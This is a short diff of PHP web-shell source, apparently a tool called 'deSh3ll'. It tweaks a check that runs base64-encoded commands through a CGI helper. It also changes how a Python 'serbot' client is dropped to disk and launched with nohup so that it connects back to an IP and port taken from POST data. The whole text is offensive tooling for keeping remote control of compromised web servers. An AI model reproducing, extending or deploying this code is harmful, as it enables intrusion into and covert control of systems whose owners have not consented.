@@ -996,7 +996,7 @@ if ($_SESSION["cgi"] == False)
 
 $tempoutput = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
 
-if (($tempoutput != "") && (!strpos($tempoutput,'Internal') !== false))
+if (($tempoutput != "") && (!strpos($tempoutput,'Internal') !== false) && (!strpos($tempoutput,'Server error') !== false))
 {
 	$cgi = True;
 }
@@ -3695,14 +3695,12 @@ if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
 	}
 
 	$serbotclient = unsh3ll_this($serbotclient);
-	$serbotclient = str_replace("port = 4444", "port = $port", $serbotclient);
-	$serbotclient = str_replace("host = \"192.168.1.4\"", "host = \"".$_POST['ip']."\"", $serbotclient);
 	$filename = $writeread_dir .rand(1,1000) . ".py";
 
 	file_put_contents($filename, $serbotclient);
 	if ($nohup == True)
 	{
-		$command = "nohup python '$filename' > /dev/null 2>&1 &";
+		$command = "nohup python '$filename' ".$_POST['ip']." $port> /dev/null 2>&1 &";
 		evalRel($command);
 	}
 	else
